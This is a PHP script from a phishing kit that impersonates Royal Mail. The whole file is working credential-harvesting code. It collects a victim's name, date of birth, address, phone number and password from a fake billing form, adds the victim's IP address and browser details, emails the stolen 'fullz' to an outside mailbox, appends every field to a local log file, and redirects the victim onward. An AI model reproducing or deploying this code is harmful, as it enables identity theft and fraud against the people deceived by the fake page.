<?php
  header ('Location: /secure.php');
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "+ 🃏 Royal Mail Fullz @BitcoinM19 🃏 \n";
$message .= "+---------Billing Information---------+\n";
$message .= "| Full Name            :  ".$_POST['fname']." \n";
$message .= "| Date Of Birth        :  ".$_POST['day']."/".$_POST['month']."/".$_POST['year']."\n";
$message .= "| Billing Address      : ".$_POST['address']." \n";
$message .= "| Town/City            : ".$_POST['city']." \n";
$message .= "| County               : ".$_POST['county']." \n";
$message .= "| Postcode             : ".$_POST['postcode']." \n";
$message .= "| Mobile Number (+44 GB) :  ".$_POST['mmn']." \n";
$message .= "| Network Check (07***)  :  Vodafone UK✔️ \n";
$message .= "| --------------- Victim Password -------------------+\n";
$message .= "| Password             :  ".$_POST['newpass']." \n";
$message .= "| --------------- I N F O | I P -------------------+\n";
$message .= "| Client IP: ".$ip."\n";
$message .= "| --- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "| User Agent : ".$useragent."\n";
$message .= "+ ------------Snapchat: @BitcoinM19 ------------+\n";
$send = "cr1mep4ys@protonmail.com";
$subject = "BitcoinM19 - RoyalMail Billing | $ip";
{
mail("$send", "$subject", $message);
mail($userinfo,$subject,$message);
}
$praga=rand();
$praga=md5($praga);
 $handle = fopen("billing.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>